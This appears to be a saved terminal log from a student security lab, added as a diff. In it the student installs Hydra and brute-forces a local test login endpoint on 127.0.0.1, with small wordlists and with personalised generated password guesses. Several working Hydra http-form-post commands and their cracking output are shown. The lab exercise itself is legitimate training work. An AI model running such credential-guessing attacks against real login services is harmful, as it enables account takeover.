@@ -1,0 +1,152 @@
+Last login: Mon Mar  2 22:02:11 on ttys000
+You have new mail.
+(base) faridhassani@Farids-MacBook-Air ~ % cd Desktop/Final_Labs/Information-Security-/Lab12/brute-force-server
+(base) faridhassani@Farids-MacBook-Air brute-force-server % pwd
+/Users/faridhassani/Desktop/Final_Labs/Information-Security-/Lab12/brute-force-server
+(base) faridhassani@Farids-MacBook-Air brute-force-server % curl -X POST "http://127.0.0.1:8000/login" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=admin&password=wrong"
+"Invalid credentials"%                                                                                (base) faridhassani@Farids-MacBook-Air brute-force-server % curl -X POST "http://127.0.0.1:8000/login" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=admin&password=12345admin"
+"secret token"%                                                                                       (base) faridhassani@Farids-MacBook-Air brute-force-server % brew install hydra
+✔︎ JSON API cask.jws.json                                                   Downloaded   15.3MB/ 15.3MB
+✔︎ JSON API formula.jws.json                                                Downloaded   31.9MB/ 31.9MB
+==> Fetching downloads for: hydra
+✔︎ Bottle Manifest hydra (9.6)                                              Downloaded   25.0KB/ 25.0KB
+✔︎ Bottle Manifest mariadb-connector-c (3.4.8_1)                            Downloaded   17.8KB/ 17.8KB
+✔︎ Bottle hydra (9.6)                                                       Downloaded  605.6KB/605.6KB
+✔︎ Bottle mariadb-connector-c (3.4.8_1)                                     Downloaded  463.4KB/463.4KB
+==> Installing hydra dependency: mariadb-connector-c
+==> Pouring mariadb-connector-c--3.4.8_1.arm64_tahoe.bottle.tar.gz
+🍺  /opt/homebrew/Cellar/mariadb-connector-c/3.4.8_1: 164 files, 1.6MB
+==> Pouring hydra--9.6.arm64_tahoe.bottle.tar.gz
+🍺  /opt/homebrew/Cellar/hydra/9.6: 17 files, 1.8MB
+==> Running `brew cleanup hydra`...
+Disable this behaviour by setting `HOMEBREW_NO_INSTALL_CLEANUP=1`.
+Hide these hints with `HOMEBREW_NO_ENV_HINTS=1` (see `man brew`).
+(base) faridhassani@Farids-MacBook-Air brute-force-server % hydra -h
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]
+
+Options:
+  -R        restore a previous aborted/crashed session
+  -I        ignore an existing restore file (don't wait 10 seconds)
+  -S        perform an SSL connect
+  -s PORT   if the service is on a different default port, define it here
+  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
+  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
+  -x MIN:MAX:CHARSET  password bruteforce generation, type "-x -h" to get help
+  -y        disable use of symbols in bruteforce, see above
+  -r        use a non-random shuffling method for option -x
+  -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
+  -u        loop around users, not passwords (effective! implied with -x)
+  -C FILE   colon separated "login:pass" format, instead of -L/-P options
+  -M FILE   list of servers to attack, one entry per line, ':' to specify port
+  -D XofY   Divide wordlist into Y segments and use the Xth segment.
+  -o FILE   write found login/password pairs to FILE instead of stdout
+  -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1
+  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
+  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
+  -T TASKS  run TASKS connects in parallel overall (for -M, default: 64)
+  -w / -W TIME  wait time for a response (32) / between connects per thread (0)
+  -c TIME   wait time per login attempt over all threads (enforces -t 1)
+  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)
+  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode 
+  -O        use old SSL v2 and v3
+  -K        do not redo failed attempts (good for -M mass scanning)
+  -q        do not print messages about connection errors
+  -U        service module usage details
+  -m OPT    options specific for a module, see -U output for information
+  -h        more command line options (COMPLETE HELP)
+  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
+  service   the service to crack (see below for supported protocols)
+  OPT       some service modules support additional input (-U for module help)
+
+Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey teamspeak telnet[s] vmauthd vnc xmpp
+
+Hydra is a tool to guess/crack valid login/password pairs.
+Licensed under AGPL v3.0. The newest version is always available at;
+https://github.com/vanhauser-thc/thc-hydra
+Please don't use in military or secret service organizations, or for illegal
+purposes. (This is a wish and non-binding - most such people do not care about
+laws and ethics anyway - and tell themselves they are one of the good ones.)
+These services were not compiled in: afp firebird memcached mongodb ncp oracle postgres radmin2 rdp sapr3 svn smb2.
+
+Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
+E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
+     % export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)
+     % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080
+     % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)
+
+Examples:
+  hydra -l user -P passlist.txt ftp://192.168.0.1
+  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
+  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
+  hydra -l admin -p password ftp://[192.168.0.0/24]/
+  hydra -L logins.txt -P pws.txt -M targets.txt ssh
+(base) faridhassani@Farids-MacBook-Air brute-force-server % vim usernames.txt
+(base) faridhassani@Farids-MacBook-Air brute-force-server % vim passwords.txt
+(base) faridhassani@Farids-MacBook-Air brute-force-server % ls
+__pycache__	main.py		passwords.txt	usernames.txt	venv
+(base) faridhassani@Farids-MacBook-Air brute-force-server % hydra -f -I -V -L usernames.txt -P passwords.txt -s 8000 127.0.0.1 http-form-post "/login:username=^USER^&password=^PASS^:F=Invalid"
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-02 22:13:14
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 42 login tries (l:6/p:7), ~3 tries per task
+[DATA] attacking http-post-form://127.0.0.1:8000/login:username=^USER^&password=^PASS^:F=Invalid
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "123456" - 1 of 42 [child 0] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "password" - 2 of 42 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "admin" - 3 of 42 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "admin123" - 4 of 42 [child 3] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "12345admin" - 5 of 42 [child 4] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "qwerty" - 6 of 42 [child 5] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "letmein" - 7 of 42 [child 6] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "administrator" - pass "123456" - 8 of 42 [child 7] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "administrator" - pass "password" - 9 of 42 [child 8] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "administrator" - pass "admin" - 10 of 42 [child 9] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "administrator" - pass "admin123" - 11 of 42 [child 10] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "administrator" - pass "12345admin" - 12 of 42 [child 11] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "administrator" - pass "qwerty" - 13 of 42 [child 12] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "administrator" - pass "letmein" - 14 of 42 [child 13] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "123456" - 15 of 42 [child 14] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "password" - 16 of 42 [child 15] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "admin" - 17 of 42 [child 0] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "admin123" - 18 of 42 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "12345admin" - 19 of 42 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "qwerty" - 20 of 42 [child 3] (0/0)
+[8000][http-post-form] host: 127.0.0.1   login: admin   password: 12345admin
+[STATUS] attack finished for 127.0.0.1 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-02 22:13:15
+(base) faridhassani@Farids-MacBook-Air brute-force-server % vim generate_passwords.py
+(base) faridhassani@Farids-MacBook-Air brute-force-server % vim generate_passwords.py
+(base) faridhassani@Farids-MacBook-Air brute-force-server % python3 generate_passwords.py
+Password list generated!
+(base) faridhassani@Farids-MacBook-Air brute-force-server % cat generated_passwords.txt
+farid
+farid123
+farid2003
+Farid2003
+farid@123
+farid12345
+2003farid
+farid_admin
+(base) faridhassani@Farids-MacBook-Air brute-force-server % hydra -f -I -V -l admin -P generated_passwords.txt -s 8000 127.0.0.1 http-form-post "/login:username=^USER^&password=^PASS^:F=Invalid"
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-02 22:16:47
+[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
+[DATA] attacking http-post-form://127.0.0.1:8000/login:username=^USER^&password=^PASS^:F=Invalid
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "farid" - 1 of 8 [child 0] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "farid123" - 2 of 8 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "farid2003" - 3 of 8 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "Farid2003" - 4 of 8 [child 3] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "farid@123" - 5 of 8 [child 4] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "farid12345" - 6 of 8 [child 5] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "2003farid" - 7 of 8 [child 6] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "farid_admin" - 8 of 8 [child 7] (0/0)
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-02 22:16:48
+(base) faridhassani@Farids-MacBook-Air brute-force-server % 
